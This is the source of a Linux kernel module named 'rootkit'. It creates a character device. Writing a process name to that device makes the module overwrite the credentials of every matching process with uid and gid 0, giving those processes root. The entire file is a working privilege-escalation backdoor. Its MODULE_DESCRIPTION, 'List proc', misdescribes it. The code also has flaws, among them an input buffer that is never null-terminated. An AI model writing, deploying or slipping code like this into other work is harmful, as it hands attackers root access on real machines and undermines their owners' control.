#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/kdev_t.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
/*
 * This function is called when this module is loaded.
 */

#define DEV_NAME  "rootkit"
#define EOK 0 

static dev_t dev_number; 
static struct class *dev_cl;
static struct cdev c_dev;

static ssize_t rootkit_write(struct file *f, const char __user *buf, size_t len, loff_t *ppos)
{
	void *mem;
	struct task_struct *task;
	struct cred *cr;
	int count = -1;

	if((mem = kmalloc(len, GFP_KERNEL)) == NULL){
		printk(KERN_ERR "===== Error: kmalloc =====\n");
		goto close;
	}
	
	if(copy_from_user(mem, buf, len-1)){
		printk(KERN_ERR "===== Error: copy_from_user =====\n");
		goto freemem;
	}

	for_each_process(task){
		if(strstr(task->comm, mem)){
			task_lock(task);
			cr = __task_cred(task);
			
			cr->uid = cr->euid = 0;
			cr->gid = cr->egid = 0;
			cr->suid = cr->fsuid = 0;
			cr->sgid = cr->fsgid = 0;
			
			task_unlock(task);
		}
	}
	
	printk(KERN_ERR "%s\n", mem);

	kfree(mem);

	return len;

freemem:
	kfree(mem);
close:
	*ppos = count;
	return count;
}


static struct file_operations dev_fops = {
	 .owner = THIS_MODULE,
	 .write = rootkit_write
 };


static int __init rootkit_init(void)
{
	int ret;

	/* получаю нормера устройства */
	if((ret=alloc_chrdev_region(&dev_number, 0, 1, DEV_NAME)) < 0){
		printk(KERN_ERR "===== Error: alloc_chrdev_region  =====\n");
		goto error;
	}
	/* создаю класс */
	if(NULL == (dev_cl=class_create(THIS_MODULE, "chardev"))){
		printk(KERN_ERR "===== Error: class_create =====\n");
		goto unregister;
	}
	
	/* создаю девайс */
	if(NULL == device_create(dev_cl, NULL, dev_number, NULL, DEV_NAME)){
		printk(KERN_ERR "===== Error: device_create =====\n");
		goto cdestroy;
	}
	
	cdev_init(&c_dev, &dev_fops);
	c_dev.owner = THIS_MODULE;
	if(0 > cdev_add(&c_dev, dev_number, 1)){
		printk(KERN_ERR "===== Error: cdev_add =====\n");
		goto ddestroy;
	}
	printk(KERN_INFO "==========  Module init! ==========\n");
	return 0;

ddestroy:
	device_destroy(dev_cl, dev_number);
cdestroy:
	class_destroy(dev_cl);
unregister:
	unregister_chrdev_region(dev_number, 1);
error:
	return -1;
}

static void __exit rootkit_exit(void)
{
	cdev_del(&c_dev);
	device_destroy(dev_cl, dev_number);
	class_destroy(dev_cl);
	unregister_chrdev_region(dev_number, 1);
	printk(KERN_ERR "========== Module exit! ==========\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_AUTHOR("Skokov Stanislav <skokov1992@main.ru>");
MODULE_DESCRIPTION("List proc");
MODULE_LICENSE("GPL v2");
